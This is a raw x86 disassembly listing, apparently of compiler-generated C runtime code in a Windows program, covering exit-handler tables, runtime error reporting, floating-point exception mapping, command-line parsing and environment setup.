  422b3f:	cmp    DWORD PTR [ebp-0x1c],esi
  422b42:	jne    0x422b4a
  422b44:	push   edi
  422b45:	call   0x422d05
  422b4a:	call   0x422d27
  422b4f:	jmp    0x422b7c
  422b51:	mov    eax,DWORD PTR [ebp-0x14]
  422b54:	mov    ecx,DWORD PTR [eax]
  422b56:	mov    ecx,DWORD PTR [ecx]
  422b58:	mov    DWORD PTR [ebp-0x70],ecx
  422b5b:	push   eax
  422b5c:	push   ecx
  422b5d:	call   0x422ef5
  422b62:	pop    ecx
  422b63:	pop    ecx
  422b64:	ret    
  422b65:	mov    esp,DWORD PTR [ebp-0x18]
  422b68:	mov    edi,DWORD PTR [ebp-0x70]
  422b6b:	cmp    DWORD PTR [ebp-0x1c],0x0
  422b6f:	jne    0x422b77
  422b71:	push   edi
  422b72:	call   0x422d16
  422b77:	call   0x422d36
  422b7c:	or     DWORD PTR [ebp-0x4],0xffffffff
  422b80:	mov    eax,edi
  422b82:	lea    esp,[ebp-0x7c]
  422b85:	call   0x4238e3
  422b8a:	ret    
  422b8b:	push   0x428134
  422b90:	call   DWORD PTR ds:0x428018
  422b96:	test   eax,eax
  422b98:	je     0x422bb0
  422b9a:	push   0x428124
  422b9f:	push   eax
  422ba0:	call   DWORD PTR ds:0x42801c
  422ba6:	test   eax,eax
  422ba8:	je     0x422bb0
  422baa:	push   DWORD PTR [esp+0x4]
  422bae:	call   eax
  422bb0:	push   DWORD PTR [esp+0x4]
  422bb4:	call   DWORD PTR ds:0x42802c
  422bba:	int3   
  422bbb:	push   0x8
  422bbd:	call   0x423a6f
  422bc2:	pop    ecx
  422bc3:	ret    
  422bc4:	push   0x8
  422bc6:	call   0x4239db
  422bcb:	pop    ecx
  422bcc:	ret    
  422bcd:	mov    eax,ds:0x45d270
  422bd2:	test   eax,eax
  422bd4:	je     0x422bd8
  422bd6:	call   eax
  422bd8:	push   esi
  422bd9:	push   edi
  422bda:	mov    ecx,0x42a00c
  422bdf:	mov    edi,0x42a018
  422be4:	xor    eax,eax
  422be6:	cmp    ecx,edi
  422be8:	mov    esi,ecx
  422bea:	jae    0x422c03
  422bec:	test   eax,eax
  422bee:	jne    0x422c2f
  422bf0:	mov    ecx,DWORD PTR [esi]
  422bf2:	test   ecx,ecx
  422bf4:	je     0x422bf8
  422bf6:	call   ecx
  422bf8:	add    esi,0x4
  422bfb:	cmp    esi,edi
  422bfd:	jb     0x422bec
  422bff:	test   eax,eax
  422c01:	jne    0x422c2f
  422c03:	push   0x4236fb
  422c08:	call   0x423b80
  422c0d:	mov    esi,0x42a000
  422c12:	mov    eax,esi
  422c14:	mov    edi,0x42a008
  422c19:	cmp    eax,edi
  422c1b:	pop    ecx
  422c1c:	jae    0x422c2d
  422c1e:	mov    eax,DWORD PTR [esi]
  422c20:	test   eax,eax
  422c22:	je     0x422c26
  422c24:	call   eax
  422c26:	add    esi,0x4
  422c29:	cmp    esi,edi
  422c2b:	jb     0x422c1e
  422c2d:	xor    eax,eax
  422c2f:	pop    edi
  422c30:	pop    esi
  422c31:	ret    
  422c32:	push   ebp
  422c33:	mov    ebp,esp
  422c35:	push   esi
  422c36:	push   edi
  422c37:	push   0x8
  422c39:	call   0x423a6f
  422c3e:	xor    esi,esi
  422c40:	inc    esi
  422c41:	cmp    DWORD PTR ds:0x45cb04,esi
  422c47:	pop    ecx
  422c48:	jne    0x422c5a
  422c4a:	push   DWORD PTR [ebp+0x8]
  422c4d:	call   DWORD PTR ds:0x428034
  422c53:	push   eax
  422c54:	call   DWORD PTR ds:0x428030
  422c5a:	cmp    DWORD PTR [ebp+0xc],0x0
  422c5e:	mov    al,BYTE PTR [ebp+0x10]
  422c61:	mov    DWORD PTR ds:0x45cb00,esi
  422c67:	mov    ds:0x45cafc,al
  422c6c:	jne    0x422cc0
  422c6e:	mov    ecx,DWORD PTR ds:0x45d268
  422c74:	test   ecx,ecx
  422c76:	je     0x422ca1
  422c78:	mov    eax,ds:0x45d264
  422c7d:	sub    eax,0x4
  422c80:	cmp    eax,ecx
  422c82:	jmp    0x422c9a
  422c84:	mov    eax,DWORD PTR [eax]
  422c86:	test   eax,eax
  422c88:	je     0x422c8c
  422c8a:	call   eax
  422c8c:	mov    eax,ds:0x45d264
  422c91:	sub    eax,0x4
  422c94:	cmp    eax,DWORD PTR ds:0x45d268
  422c9a:	mov    ds:0x45d264,eax
  422c9f:	jae    0x422c84
  422ca1:	mov    eax,0x42a01c
  422ca6:	mov    esi,0x42a020
  422cab:	cmp    eax,esi
  422cad:	mov    edi,eax
  422caf:	jae    0x422cc0
  422cb1:	mov    eax,DWORD PTR [edi]
  422cb3:	test   eax,eax
  422cb5:	je     0x422cb9
  422cb7:	call   eax
  422cb9:	add    edi,0x4
  422cbc:	cmp    edi,esi
  422cbe:	jb     0x422cb1
  422cc0:	mov    eax,0x42a024
  422cc5:	mov    esi,0x42a028
  422cca:	cmp    eax,esi
  422ccc:	mov    edi,eax
  422cce:	jae    0x422cdf
  422cd0:	mov    eax,DWORD PTR [edi]
  422cd2:	test   eax,eax
  422cd4:	je     0x422cd8
  422cd6:	call   eax
  422cd8:	add    edi,0x4
  422cdb:	cmp    edi,esi
  422cdd:	jb     0x422cd0
  422cdf:	cmp    DWORD PTR [ebp+0x10],0x0
  422ce3:	pop    edi
  422ce4:	pop    esi
  422ce5:	je     0x422cf0
  422ce7:	push   0x8
  422ce9:	call   0x4239db
  422cee:	jmp    0x422d02
  422cf0:	push   DWORD PTR [ebp+0x8]
  422cf3:	mov    DWORD PTR ds:0x45cb04,0x1
  422cfd:	call   0x422b8b
  422d02:	pop    ecx
  422d03:	pop    ebp
  422d04:	ret    
  422d05:	push   0x0
  422d07:	push   0x0
  422d09:	push   DWORD PTR [esp+0xc]
  422d0d:	call   0x422c32
  422d12:	add    esp,0xc
  422d15:	ret    
  422d16:	push   0x0
  422d18:	push   0x1
  422d1a:	push   DWORD PTR [esp+0xc]
  422d1e:	call   0x422c32
  422d23:	add    esp,0xc
  422d26:	ret    
  422d27:	push   0x1
  422d29:	push   0x0
  422d2b:	push   0x0
  422d2d:	call   0x422c32
  422d32:	add    esp,0xc
  422d35:	ret    
  422d36:	push   0x1
  422d38:	push   0x1
  422d3a:	push   0x0
  422d3c:	call   0x422c32
  422d41:	add    esp,0xc
  422d44:	ret    
  422d45:	push   ebp
  422d46:	mov    ebp,esp
  422d48:	sub    esp,0x10c
  422d4e:	mov    eax,ds:0x45c430
  422d53:	xor    eax,DWORD PTR [ebp+0x4]
  422d56:	mov    ecx,DWORD PTR [ebp+0x8]
  422d59:	push   ebx
  422d5a:	push   esi
  422d5b:	mov    DWORD PTR [ebp-0x4],eax
  422d5e:	xor    edx,edx
  422d60:	push   edi
  422d61:	xor    eax,eax
  422d63:	cmp    ecx,DWORD PTR [eax*8+0x45c1c8]
  422d6a:	je     0x422d72
  422d6c:	inc    eax
  422d6d:	cmp    eax,0x12
  422d70:	jb     0x422d63
  422d72:	mov    esi,eax
  422d74:	shl    esi,0x3
  422d77:	cmp    ecx,DWORD PTR [esi+0x45c1c8]
  422d7d:	jne    0x422ea6
  422d83:	mov    eax,ds:0x45cabc
  422d88:	cmp    eax,0x1
  422d8b:	je     0x422e81
  422d91:	cmp    eax,edx
  422d93:	jne    0x422da2
  422d95:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422d9c:	je     0x422e81
  422da2:	cmp    ecx,0xfc
  422da8:	je     0x422ea6
  422dae:	push   0x104
  422db3:	lea    eax,[ebp-0x10c]
  422db9:	push   eax
  422dba:	push   edx
  422dbb:	mov    BYTE PTR [ebp-0x8],dl
  422dbe:	call   DWORD PTR ds:0x428040
  422dc4:	test   eax,eax
  422dc6:	jne    0x422ddb
  422dc8:	lea    eax,[ebp-0x10c]
  422dce:	push   0x42848c
  422dd3:	push   eax
  422dd4:	call   0x423c90
  422dd9:	pop    ecx
  422dda:	pop    ecx
  422ddb:	lea    eax,[ebp-0x10c]
  422de1:	push   eax
  422de2:	lea    edi,[ebp-0x10c]
  422de8:	call   0x423ec0
  422ded:	inc    eax
  422dee:	cmp    eax,0x3c
  422df1:	pop    ecx
  422df2:	jbe    0x422e1d
  422df4:	lea    eax,[ebp-0x10c]
  422dfa:	push   eax
  422dfb:	call   0x423ec0
  422e00:	mov    edi,eax
  422e02:	lea    eax,[ebp-0x10c]
  422e08:	sub    eax,0x3b
  422e0b:	push   0x3
  422e0d:	add    edi,eax
  422e0f:	push   0x428488
  422e14:	push   edi
  422e15:	call   0x423d90
  422e1a:	add    esp,0x10
  422e1d:	push   edi
  422e1e:	call   0x423ec0
  422e23:	push   DWORD PTR [esi+0x45c1cc]
  422e29:	mov    ebx,eax
  422e2b:	call   0x423ec0
  422e30:	lea    eax,[ebx+eax*1+0x1c]
  422e34:	pop    ecx
  422e35:	add    eax,0x3
  422e38:	pop    ecx
  422e39:	and    eax,0xfffffffc
  422e3c:	call   0x423900
  422e41:	mov    ebx,esp
  422e43:	push   0x42846c
  422e48:	push   ebx
  422e49:	call   0x423c90
  422e4e:	push   edi
  422e4f:	push   ebx
  422e50:	call   0x423ca0
  422e55:	push   0x428468
  422e5a:	push   ebx
  422e5b:	call   0x423ca0
  422e60:	push   DWORD PTR [esi+0x45c1cc]
  422e66:	push   ebx
  422e67:	call   0x423ca0
  422e6c:	push   0x12010
  422e71:	push   0x428440
  422e76:	push   ebx
  422e77:	call   0x423b92
  422e7c:	add    esp,0x2c
  422e7f:	jmp    0x422ea6
  422e81:	push   edx
  422e82:	lea    eax,[ebp+0x8]
  422e85:	push   eax
  422e86:	lea    esi,[esi+0x45c1cc]
  422e8c:	push   DWORD PTR [esi]
  422e8e:	call   0x423ec0
  422e93:	pop    ecx
  422e94:	push   eax
  422e95:	push   DWORD PTR [esi]
  422e97:	push   0xfffffff4
  422e99:	call   DWORD PTR ds:0x42803c
  422e9f:	push   eax
  422ea0:	call   DWORD PTR ds:0x428038
  422ea6:	lea    esp,[ebp-0x118]
  422eac:	mov    ecx,DWORD PTR [ebp-0x4]
  422eaf:	xor    ecx,DWORD PTR [ebp+0x4]
  422eb2:	call   0x423f7c
  422eb7:	pop    edi
  422eb8:	pop    esi
  422eb9:	pop    ebx
  422eba:	leave  
  422ebb:	ret    
  422ebc:	mov    eax,ds:0x45cabc
  422ec1:	cmp    eax,0x1
  422ec4:	je     0x422ed3
  422ec6:	test   eax,eax
  422ec8:	jne    0x422ef4
  422eca:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422ed1:	jne    0x422ef4
  422ed3:	push   0xfc
  422ed8:	call   0x422d45
  422edd:	mov    eax,ds:0x45cb08
  422ee2:	test   eax,eax
  422ee4:	pop    ecx
  422ee5:	je     0x422ee9
  422ee7:	call   eax
  422ee9:	push   0xff
  422eee:	call   0x422d45
  422ef3:	pop    ecx
  422ef4:	ret    
  422ef5:	push   ebp
  422ef6:	mov    ebp,esp
  422ef8:	push   ecx
  422ef9:	push   ebx
  422efa:	push   esi
  422efb:	push   edi
  422efc:	call   0x42375d
  422f01:	mov    edi,DWORD PTR [ebp+0x8]
  422f04:	mov    esi,eax
  422f06:	mov    edx,DWORD PTR [esi+0x54]
  422f09:	mov    eax,ds:0x45c2dc
  422f0e:	mov    ecx,edx
  422f10:	cmp    DWORD PTR [ecx],edi
  422f12:	je     0x422f21
  422f14:	lea    ebx,[eax+eax*2]
  422f17:	add    ecx,0xc
  422f1a:	lea    ebx,[edx+ebx*4]
  422f1d:	cmp    ecx,ebx
  422f1f:	jb     0x422f10
  422f21:	lea    eax,[eax+eax*2]
  422f24:	lea    eax,[edx+eax*4]
  422f27:	cmp    ecx,eax
  422f29:	jae    0x422f2f
  422f2b:	cmp    DWORD PTR [ecx],edi
  422f2d:	je     0x422f31
  422f2f:	xor    ecx,ecx
  422f31:	test   ecx,ecx
  422f33:	je     0x42304b
  422f39:	mov    ebx,DWORD PTR [ecx+0x8]
  422f3c:	test   ebx,ebx
  422f3e:	mov    DWORD PTR [ebp+0x8],ebx
  422f41:	je     0x42304b
  422f47:	cmp    ebx,0x5
  422f4a:	jne    0x422f58
  422f4c:	and    DWORD PTR [ecx+0x8],0x0
  422f50:	xor    eax,eax
  422f52:	inc    eax
  422f53:	jmp    0x423054
  422f58:	cmp    ebx,0x1
  422f5b:	je     0x423046
  422f61:	mov    eax,DWORD PTR [esi+0x58]
  422f64:	mov    DWORD PTR [ebp-0x4],eax
  422f67:	mov    eax,DWORD PTR [ebp+0xc]
  422f6a:	mov    DWORD PTR [esi+0x58],eax
  422f6d:	mov    eax,DWORD PTR [ecx+0x4]
  422f70:	cmp    eax,0x8
  422f73:	jne    0x423038
  422f79:	mov    edx,DWORD PTR ds:0x45c2d0
  422f7f:	mov    eax,ds:0x45c2d4
  422f84:	add    eax,edx
  422f86:	cmp    edx,eax
  422f88:	jge    0x422fb1
  422f8a:	lea    eax,[edx+edx*2]
  422f8d:	shl    eax,0x2
  422f90:	mov    edi,DWORD PTR [esi+0x54]
  422f93:	and    DWORD PTR [eax+edi*1+0x8],0x0
  422f98:	mov    edi,DWORD PTR ds:0x45c2d0
  422f9e:	mov    ebx,DWORD PTR ds:0x45c2d4
  422fa4:	inc    edx
  422fa5:	add    ebx,edi
  422fa7:	add    eax,0xc
  422faa:	cmp    edx,ebx
  422fac:	jl     0x422f90
  422fae:	mov    ebx,DWORD PTR [ebp+0x8]
  422fb1:	mov    ecx,DWORD PTR [ecx]
  422fb3:	cmp    ecx,0xc000008e
  422fb9:	mov    edi,DWORD PTR [esi+0x5c]
  422fbc:	jne    0x422fc7
  422fbe:	mov    DWORD PTR [esi+0x5c],0x83
  422fc5:	jmp    0x42302b
  422fc7:	cmp    ecx,0xc0000090
  422fcd:	jne    0x422fd8
  422fcf:	mov    DWORD PTR [esi+0x5c],0x81
  422fd6:	jmp    0x42302b
  422fd8:	cmp    ecx,0xc0000091
  422fde:	jne    0x422fe9
  422fe0:	mov    DWORD PTR [esi+0x5c],0x84
  422fe7:	jmp    0x42302b
  422fe9:	cmp    ecx,0xc0000093
  422fef:	jne    0x422ffa
  422ff1:	mov    DWORD PTR [esi+0x5c],0x85
  422ff8:	jmp    0x42302b
  422ffa:	cmp    ecx,0xc000008d
  423000:	jne    0x42300b
  423002:	mov    DWORD PTR [esi+0x5c],0x82
  423009:	jmp    0x42302b
  42300b:	cmp    ecx,0xc000008f
  423011:	jne    0x42301c
  423013:	mov    DWORD PTR [esi+0x5c],0x86
  42301a:	jmp    0x42302b
  42301c:	cmp    ecx,0xc0000092
  423022:	jne    0x42302b
  423024:	mov    DWORD PTR [esi+0x5c],0x8a
  42302b:	push   DWORD PTR [esi+0x5c]
  42302e:	push   0x8
  423030:	call   ebx
  423032:	pop    ecx
  423033:	mov    DWORD PTR [esi+0x5c],edi
  423036:	jmp    0x42303f
  423038:	and    DWORD PTR [ecx+0x8],0x0
  42303c:	push   eax
  42303d:	call   ebx
  42303f:	mov    eax,DWORD PTR [ebp-0x4]
  423042:	pop    ecx
  423043:	mov    DWORD PTR [esi+0x58],eax
  423046:	or     eax,0xffffffff
  423049:	jmp    0x423054
  42304b:	push   DWORD PTR [ebp+0xc]
  42304e:	call   DWORD PTR ds:0x428044
  423054:	pop    edi
  423055:	pop    esi
  423056:	pop    ebx
  423057:	leave  
  423058:	ret    
  423059:	cmp    DWORD PTR ds:0x45d26c,0x0
  423060:	jne    0x423067
  423062:	call   0x42449c
  423067:	push   esi
  423068:	mov    esi,DWORD PTR ds:0x45d274
  42306e:	test   esi,esi
  423070:	jne    0x423079
  423072:	mov    esi,0x4284a3
  423077:	jmp    0x4230be
  423079:	mov    al,BYTE PTR [esi]
  42307b:	cmp    al,0x22
  42307d:	jne    0x4230a7
  42307f:	inc    esi
  423080:	mov    al,BYTE PTR [esi]
  423082:	cmp    al,0x22
  423084:	je     0x4230b7
  423086:	test   al,al
  423088:	je     0x4230a0
  42308a:	movzx  eax,al
  42308d:	push   eax
  42308e:	call   0x423fbb
  423093:	test   eax,eax
  423095:	pop    ecx
  423096:	je     0x423099
  423098:	inc    esi
  423099:	inc    esi
  42309a:	mov    al,BYTE PTR [esi]
  42309c:	cmp    al,0x22
  42309e:	jne    0x423086
  4230a0:	cmp    BYTE PTR [esi],0x22
  4230a3:	jne    0x4230b8
  4230a5:	jmp    0x4230b7
  4230a7:	cmp    al,0x20
  4230a9:	jbe    0x4230b8
  4230ab:	inc    esi
  4230ac:	cmp    BYTE PTR [esi],0x20
  4230af:	ja     0x4230ab
  4230b1:	jmp    0x4230b8
  4230b3:	cmp    al,0x20
  4230b5:	ja     0x4230be
  4230b7:	inc    esi
  4230b8:	mov    al,BYTE PTR [esi]
  4230ba:	test   al,al
  4230bc:	jne    0x4230b3
  4230be:	mov    eax,esi
  4230c0:	pop    esi
  4230c1:	ret    
  4230c2:	push   ebx
  4230c3:	xor    ebx,ebx
  4230c5:	cmp    DWORD PTR ds:0x45d26c,ebx
  4230cb:	push   esi
  4230cc:	push   edi
  4230cd:	jne    0x4230d4
  4230cf:	call   0x42449c
  4230d4:	mov    esi,DWORD PTR ds:0x45cab4
  4230da:	xor    edi,edi
  4230dc:	cmp    esi,ebx
  4230de:	jne    0x4230f2
  4230e0:	jmp    0x423112
  4230e2:	cmp    al,0x3d
  4230e4:	je     0x4230e7
  4230e6:	inc    edi
  4230e7:	push   esi
  4230e8:	call   0x423ec0
  4230ed:	pop    ecx
  4230ee:	lea    esi,[esi+eax*1+0x1]
  4230f2:	mov    al,BYTE PTR [esi]
  4230f4:	cmp    al,bl
  4230f6:	jne    0x4230e2
  4230f8:	lea    eax,[edi*4+0x4]
  4230ff:	push   eax
  423100:	call   0x4245d2
  423105:	mov    edi,eax
  423107:	cmp    edi,ebx
  423109:	pop    ecx
  42310a:	mov    DWORD PTR ds:0x45cae4,edi
  423110:	jne    0x423117
  423112:	or     eax,0xffffffff
  423115:	jmp    0x42316f
  423117:	mov    esi,DWORD PTR ds:0x45cab4
  42311d:	push   ebp
  42311e:	jmp    0x42314a
  423120:	push   esi
  423121:	call   0x423ec0
  423126:	mov    ebp,eax
  423128:	inc    ebp
  423129:	cmp    BYTE PTR [esi],0x3d
  42312c:	pop    ecx
  42312d:	je     0x423148
  42312f:	push   ebp
  423130:	call   0x4245d2
  423135:	cmp    eax,ebx
  423137:	pop    ecx
  423138:	mov    DWORD PTR [edi],eax
  42313a:	je     0x423173
  42313c:	push   esi
  42313d:	push   eax
  42313e:	call   0x423c90
  423143:	pop    ecx
  423144:	pop    ecx
  423145:	add    edi,0x4
  423148:	add    esi,ebp
  42314a:	cmp    BYTE PTR [esi],bl
  42314c:	jne    0x423120
  42314e:	push   DWORD PTR ds:0x45cab4
  423154:	call   0x4244ba
  423159:	mov    DWORD PTR ds:0x45cab4,ebx
  42315f:	mov    DWORD PTR [edi],ebx
  423161:	mov    DWORD PTR ds:0x45d260,0x1
  42316b:	xor    eax,eax
  42316d:	pop    ecx
  42316e:	pop    ebp
  42316f:	pop    edi
  423170:	pop    esi
  423171:	pop    ebx
  423172:	ret    
  423173:	push   DWORD PTR ds:0x45cae4
  423179:	call   0x4244ba
  42317e:	mov    DWORD PTR ds:0x45cae4,ebx
  423184:	or     eax,0xffffffff
  423187:	jmp    0x42316d
  423189:	push   ebp
  42318a:	mov    ebp,esp
  42318c:	push   ecx
  42318d:	push   ebx
  42318e:	mov    ebx,DWORD PTR [ebp+0xc]
  423191:	xor    edx,edx
  423193:	cmp    DWORD PTR [ebp+0x8],edx
  423196:	push   edi
  423197:	mov    DWORD PTR [esi],edx
  423199:	mov    edi,ecx
  42319b:	mov    DWORD PTR [ebx],0x1
  4231a1:	je     0x4231ac
  4231a3:	mov    ecx,DWORD PTR [ebp+0x8]
  4231a6:	add    DWORD PTR [ebp+0x8],0x4
  4231aa:	mov    DWORD PTR [ecx],edi
  4231ac:	cmp    BYTE PTR [eax],0x22
  4231af:	jne    0x4231bf
  4231b1:	xor    ecx,ecx
  4231b3:	test   edx,edx
  4231b5:	sete   cl
  4231b8:	inc    eax
  4231b9:	mov    edx,ecx
  4231bb:	mov    cl,0x22
  4231bd:	jmp    0x4231ec
  4231bf:	inc    DWORD PTR [esi]
  4231c1:	test   edi,edi
  4231c3:	je     0x4231ca
  4231c5:	mov    cl,BYTE PTR [eax]
  4231c7:	mov    BYTE PTR [edi],cl
  4231c9:	inc    edi
  4231ca:	mov    cl,BYTE PTR [eax]
  4231cc:	movzx  ebx,cl
  4231cf:	inc    eax
  4231d0:	test   BYTE PTR [ebx+0x45cf21],0x4
  4231d7:	je     0x4231e5
  4231d9:	inc    DWORD PTR [esi]
  4231db:	test   edi,edi
  4231dd:	je     0x4231e4
  4231df:	mov    bl,BYTE PTR [eax]
  4231e1:	mov    BYTE PTR [edi],bl
  4231e3:	inc    edi
  4231e4:	inc    eax
  4231e5:	test   cl,cl
  4231e7:	mov    ebx,DWORD PTR [ebp+0xc]
  4231ea:	je     0x42321e
  4231ec:	test   edx,edx
  4231ee:	jne    0x4231ac
  4231f0:	cmp    cl,0x20
  4231f3:	je     0x4231fa
  4231f5:	cmp    cl,0x9
  4231f8:	jne    0x4231ac
  4231fa:	test   edi,edi
  4231fc:	je     0x423202
  4231fe:	and    BYTE PTR [edi-0x1],0x0
  423202:	and    DWORD PTR [ebp-0x4],0x0
  423206:	cmp    BYTE PTR [eax],0x0
  423209:	je     0x4232e5
  42320f:	mov    cl,BYTE PTR [eax]
  423211:	cmp    cl,0x20
  423214:	je     0x42321b
  423216:	cmp    cl,0x9
  423219:	jne    0x423221
  42321b:	inc    eax
  42321c:	jmp    0x42320f
  42321e:	dec    eax
  42321f:	jmp    0x423202
  423221:	cmp    BYTE PTR [eax],0x0
  423224:	je     0x4232e5
  42322a:	cmp    DWORD PTR [ebp+0x8],0x0
  42322e:	je     0x423239
  423230:	mov    ecx,DWORD PTR [ebp+0x8]
  423233:	add    DWORD PTR [ebp+0x8],0x4
  423237:	mov    DWORD PTR [ecx],edi
  423239:	inc    DWORD PTR [ebx]
  42323b:	xor    ebx,ebx
  42323d:	inc    ebx
  42323e:	xor    edx,edx
  423240:	jmp    0x423244
  423242:	inc    eax
  423243:	inc    edx
  423244:	cmp    BYTE PTR [eax],0x5c
  423247:	je     0x423242
  423249:	cmp    BYTE PTR [eax],0x22
  42324c:	jne    0x423274
  42324e:	test   dl,0x1
  423251:	jne    0x423272
  423253:	cmp    DWORD PTR [ebp-0x4],0x0
  423257:	je     0x423265
  423259:	lea    ecx,[eax+0x1]
  42325c:	cmp    BYTE PTR [ecx],0x22
  42325f:	jne    0x423265
  423261:	mov    eax,ecx
  423263:	jmp    0x423267
  423265:	xor    ebx,ebx
  423267:	xor    ecx,ecx
  423269:	cmp    DWORD PTR [ebp-0x4],ecx
  42326c:	sete   cl
  42326f:	mov    DWORD PTR [ebp-0x4],ecx
  423272:	shr    edx,1
  423274:	test   edx,edx
  423276:	je     0x423285
  423278:	test   edi,edi
  42327a:	je     0x423280
  42327c:	mov    BYTE PTR [edi],0x5c
  42327f:	inc    edi
  423280:	inc    DWORD PTR [esi]
  423282:	dec    edx
  423283:	jne    0x423278
  423285:	mov    cl,BYTE PTR [eax]
  423287:	test   cl,cl
  423289:	je     0x4232d3
  42328b:	cmp    DWORD PTR [ebp-0x4],0x0
  42328f:	jne    0x42329b
  423291:	cmp    cl,0x20
  423294:	je     0x4232d3
  423296:	cmp    cl,0x9
  423299:	je     0x4232d3
  42329b:	test   ebx,ebx
  42329d:	je     0x4232cd
  42329f:	test   edi,edi
  4232a1:	je     0x4232bc
  4232a3:	movzx  edx,cl
  4232a6:	test   BYTE PTR [edx+0x45cf21],0x4
  4232ad:	je     0x4232b5
  4232af:	mov    BYTE PTR [edi],cl
  4232b1:	inc    edi
  4232b2:	inc    eax
  4232b3:	inc    DWORD PTR [esi]
  4232b5:	mov    cl,BYTE PTR [eax]
  4232b7:	mov    BYTE PTR [edi],cl
  4232b9:	inc    edi
  4232ba:	jmp    0x4232cb
  4232bc:	movzx  ecx,cl
  4232bf:	test   BYTE PTR [ecx+0x45cf21],0x4
  4232c6:	je     0x4232cb
  4232c8:	inc    eax
  4232c9:	inc    DWORD PTR [esi]
  4232cb:	inc    DWORD PTR [esi]
  4232cd:	inc    eax
  4232ce:	jmp    0x42323b
  4232d3:	test   edi,edi
  4232d5:	je     0x4232db
  4232d7:	and    BYTE PTR [edi],0x0
  4232da:	inc    edi
  4232db:	inc    DWORD PTR [esi]
  4232dd:	mov    ebx,DWORD PTR [ebp+0xc]
  4232e0:	jmp    0x423206
  4232e5:	mov    eax,DWORD PTR [ebp+0x8]
  4232e8:	test   eax,eax
  4232ea:	je     0x4232ef
  4232ec:	and    DWORD PTR [eax],0x0
  4232ef:	inc    DWORD PTR [ebx]
  4232f1:	pop    edi
  4232f2:	pop    ebx
  4232f3:	leave  
  4232f4:	ret    
  4232f5:	push   ebp
  4232f6:	mov    ebp,esp
  4232f8:	push   ecx
  4232f9:	push   ecx
  4232fa:	push   ebx
  4232fb:	push   esi
  4232fc:	push   edi
  4232fd:	xor    edi,edi
  4232ff:	cmp    DWORD PTR ds:0x45d26c,edi
  423305:	jne    0x42330c
  423307:	call   0x42449c
  42330c:	and    BYTE PTR ds:0x45cc14,0x0
  423313:	push   0x104
  423318:	mov    esi,0x45cb10
  42331d:	push   esi
  42331e:	push   edi
  42331f:	call   DWORD PTR ds:0x428040
  423325:	mov    eax,ds:0x45d274
  42332a:	cmp    eax,edi
  42332c:	mov    DWORD PTR ds:0x45caf4,esi
  423332:	je     0x42333b
  423334:	cmp    BYTE PTR [eax],0x0
  423337:	mov    ebx,eax
  423339:	jne    0x42333d
  42333b:	mov    ebx,esi
  42333d:	lea    eax,[ebp-0x4]
  423340:	push   eax
  423341:	push   edi
  423342:	lea    esi,[ebp-0x8]
  423345:	xor    ecx,ecx
  423347:	mov    eax,ebx
  423349:	call   0x423189
  42334e:	mov    esi,DWORD PTR [ebp-0x4]
  423351:	mov    eax,DWORD PTR [ebp-0x8]
  423354:	shl    esi,0x2
  423357:	add    eax,esi
  423359:	push   eax
  42335a:	call   0x4245d2
  42335f:	mov    edi,eax
  423361:	add    esp,0xc
  423364:	test   edi,edi
  423366:	jne    0x42336d
  423368:	or     eax,0xffffffff
  42336b:	jmp    0x423392
  42336d:	lea    eax,[ebp-0x4]
  423370:	push   eax
  423371:	lea    ecx,[esi+edi*1]
  423374:	push   edi
  423375:	lea    esi,[ebp-0x8]
  423378:	mov    eax,ebx
  42337a:	call   0x423189
  42337f:	mov    eax,DWORD PTR [ebp-0x4]
  423382:	dec    eax
  423383:	pop    ecx
  423384:	mov    ds:0x45cad8,eax
  423389:	pop    ecx
  42338a:	mov    DWORD PTR ds:0x45cadc,edi
  423390:	xor    eax,eax
  423392:	pop    edi
  423393:	pop    esi
  423394:	pop    ebx
  423395:	leave  
  423396:	ret    
  423397:	push   ecx
  423398:	push   ecx
  423399:	mov    eax,ds:0x45cc18
  42339e:	push   ebx
  42339f:	push   ebp
  4233a0:	push   esi
  4233a1:	push   edi
  4233a2:	mov    edi,DWORD PTR ds:0x428058
  4233a8:	xor    ebx,ebx
  4233aa:	xor    esi,esi
  4233ac:	cmp    eax,ebx
  4233ae:	push   0x2
  4233b0:	pop    ebp
  4233b1:	jne    0x4233e0
  4233b3:	call   edi
  4233b5:	mov    esi,eax
  4233b7:	cmp    esi,ebx
  4233b9:	je     0x4233c7
  4233bb:	mov    DWORD PTR ds:0x45cc18,0x1
  4233c5:	jmp    0x4233e5
  4233c7:	call   DWORD PTR ds:0x428014
  4233cd:	cmp    eax,0x78
  4233d0:	jne    0x4233db
  4233d2:	mov    eax,ebp
  4233d4:	mov    ds:0x45cc18,eax
  4233d9:	jmp    0x4233e0
  4233db:	mov    eax,ds:0x45cc18
  4233e0:	cmp    eax,0x1
  4233e3:	jne    0x423462
  4233e5:	cmp    esi,ebx
  4233e7:	jne    0x4233f1
  4233e9:	call   edi
  4233eb:	mov    esi,eax
  4233ed:	cmp    esi,ebx
  4233ef:	je     0x42346a
  4233f1:	cmp    WORD PTR [esi],bx
  4233f4:	mov    eax,esi
  4233f6:	je     0x423406
  4233f8:	add    eax,ebp
  4233fa:	cmp    WORD PTR [eax],bx
  4233fd:	jne    0x4233f8
  4233ff:	add    eax,ebp
  423401:	cmp    WORD PTR [eax],bx
  423404:	jne    0x4233f8
  423406:	mov    edi,DWORD PTR ds:0x428054
  42340c:	push   ebx
  42340d:	push   ebx
  42340e:	push   ebx
  42340f:	sub    eax,esi
  423411:	push   ebx
  423412:	sar    eax,1
  423414:	inc    eax
  423415:	push   eax
  423416:	push   esi
  423417:	push   ebx
  423418:	push   ebx
  423419:	mov    DWORD PTR [esp+0x34],eax
  42341d:	call   edi
  42341f:	mov    ebp,eax
  423421:	cmp    ebp,ebx
  423423:	je     0x423457
  423425:	push   ebp
  423426:	call   0x4245d2
  42342b:	cmp    eax,ebx
  42342d:	pop    ecx
  42342e:	mov    DWORD PTR [esp+0x10],eax
  423432:	je     0x423457
  423434:	push   ebx
  423435:	push   ebx
  423436:	push   ebp
  423437:	push   eax
  423438:	push   DWORD PTR [esp+0x24]
  42343c:	push   esi
  42343d:	push   ebx
  42343e:	push   ebx
  42343f:	call   edi
  423441:	test   eax,eax
  423443:	jne    0x423453
  423445:	push   DWORD PTR [esp+0x10]
  423449:	call   0x4244ba
  42344e:	pop    ecx
  42344f:	mov    DWORD PTR [esp+0x10],ebx
  423453:	mov    ebx,DWORD PTR [esp+0x10]
  423457:	push   esi
  423458:	call   DWORD PTR ds:0x428050
  42345e:	mov    eax,ebx
  423460:	jmp    0x4234b2
  423462:	cmp    eax,ebp
  423464:	je     0x42346e
  423466:	cmp    eax,ebx
